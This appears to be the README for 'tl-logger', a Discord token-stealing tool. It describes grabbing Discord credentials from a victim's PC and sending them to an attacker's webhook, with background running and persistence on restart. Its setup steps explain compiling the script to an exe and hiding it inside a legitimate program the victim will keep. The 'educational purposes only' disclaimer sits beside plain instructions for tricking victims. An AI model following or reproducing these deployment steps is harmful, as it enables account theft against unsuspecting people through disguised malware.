# tl-logger
note: this program is for **educational purposes only.** sideline society or any of its members are not liable for any malicous intent this program may cause by its users.

## what does this do?
the program is designed to search discord information on a users pc and snatch all their webhooks to send to a webhook. the script supports many features like:
- token regeneration every minute (incase tokens reset)
- runs as a background process
- automatically runs itself every restart

## setup
there is not much to really set up. all you really have to do is:
1. replace the webhook variable with your real webhook
2. compile the python to an exe
3. put it with another exe file that is an actual useful program your victim wouldnt uninstall
4. make the other exe have a slight section that starts up the logger
